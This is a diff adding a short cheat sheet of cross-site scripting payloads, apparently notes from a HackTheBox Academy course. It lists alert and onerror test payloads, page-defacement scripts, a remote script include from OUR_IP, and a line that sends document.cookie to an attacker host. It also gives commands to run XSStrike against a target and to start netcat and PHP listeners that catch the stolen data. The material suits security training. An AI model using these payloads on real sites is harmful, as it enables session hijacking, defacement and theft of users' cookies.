@@ -1,0 +1,19 @@
+```
+<script>alert(window.origin)</script>
+<plaintext>
+<script>print()</script>
+<img src="" onerror=alert(window.origin)>
+<script>document.body.style.background = "#141d2b"</script>
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+<script>document.title = 'HackTheBox Academy'</script>
+<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
+<script>document.getElementById('urlform').remove();</script>
+<script src="http://OUR_IP/script.js"></script>
+<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
+```
+
+```
+python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
+sudo nc -lvnp 80
+sudo php -S 0.0.0.0:80
+```
